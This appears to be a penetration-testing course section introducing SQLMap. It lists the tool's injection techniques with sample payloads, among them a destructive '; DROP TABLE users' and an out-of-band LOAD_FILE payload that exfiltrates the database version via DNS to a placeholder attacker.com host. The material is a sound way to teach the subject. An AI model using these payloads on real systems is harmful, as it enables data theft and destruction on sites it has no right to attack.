
`tylapcheong@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'`

SQLMap comes with a powerful detection engine, numerous features, and a broad range of options and switches for fine-tuning the many aspects of it, such as:

Target connection	Injection detection	Fingerprinting
Enumeration	Optimization	Protection detection and bypass using "tamper" scripts
Database content retrieval	File system access	Execution of the operating system (OS) commands

## Supported SQL Injection Types

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types. We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

        shellsession
`tylapcheong@htb[/htb]$ sqlmap -hh ...SNIP...   Techniques:    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")`

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries
## Boolean-based blind SQL Injection

Example of `Boolean-based blind SQL Injection`:

```
AND 1=1
```

SQLMap exploits `Boolean-based blind SQL Injection` vulnerabilities through the differentiation of `TRUE` from `FALSE` query results, which yields 1 bit of information per request. To extract actual data (e.g., one character ≈ 1 byte), it commonly requires around ~7–8 requests per character depending on the character set and response stability.

- `TRUE` results are generally based on responses having none or marginal difference to the regular server response.
- `FALSE` results are based on responses having substantial differences from the regular server response.
- `Boolean-based blind SQL Injection` is considered as the most common SQLi type in web applications.
## Error-based SQL Injection

Example of `Error-based SQL Injection`:
`AND GTID_SUBSET(@@version,0)`

If the `database management system` (`DBMS`) errors are being returned as part of the server response for any database-related problems, then there is a probability that they can be used to carry the results for requested queries.

SQLMap has the most comprehensive list of such related payloads and covers `Error-based SQL Injection` for the following DBMSes:

```
MySQL	                PostgreSQL	Oracle
Microsoft SQL Server	Sybase	    Vertica
IBM DB2	                Firebird	MonetDB
```

Error-based SQLi is considered as faster than all other types, except UNION query-based, because it can retrieve a limited amount (e.g., 200 bytes) of data called "chunks" through each request.

---

## UNION query-based

Example of `UNION query-based SQL Injection`:

        SQL
`UNION ALL SELECT 1,@@version,3`

With the usage of `UNION`, it is generally possible to extend the original (`vulnerable`) query with the injected statements' results. This way, if the original query results are rendered as part of the response, the attacker can get additional results from the injected statements within the page response itself.  This type of SQL injection is considered the fastest, as, in the ideal scenario, the attacker would be able to pull the content of the whole database table of interest with a single request.

## Stacked queries

Example of `Stacked Queries`:

        SQL
`; DROP TABLE users`

Stacking SQL queries, also known as the "piggy-backing," is the form of injecting additional SQL statements after the vulnerable one.

## Time-based blind SQL Injection

Example of `Time-based blind SQL Injection`:

        SQL
`AND 1=IF(2>1,SLEEP(5),0)`

The principle of `Time-based blind SQL Injection` is similar to the `Boolean-based blind SQL Injection`, but here the response time is used as the source for the differentiation between `TRUE` or `FALSE`.

- `TRUE` response is generally characterized by the noticeable difference in the response time compared to the regular server response
- `FALSE` response should result in a response time indistinguishable from regular response times
`
Time-based blind SQL Injection` is considerably slower than the boolean-based blind SQLi, since queries resulting in `TRUE` would delay the server response. This SQLi type is used in cases where `Boolean-based blind SQL Injection` is not applicable.

## Inline queries

Example of `Inline Queries`:

        SQL
`SELECT (SELECT @@version) from`

This type of injection embedded a query within the original query. Such SQL injection is uncommon, as it needs the vulnerable web app to be written in a certain way. Still, SQLMap supports this kind of SQLi as well.

---

## Out-of-band SQL Injection

Example of `Out-of-band SQL Injection`:

        SQL
`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the vulnerable web application or are too slow (e.g., time-based blind SQLi). SQLMap supports out-of-band SQLi through "DNS exfiltration," where requested queries are retrieved through DNS traffic.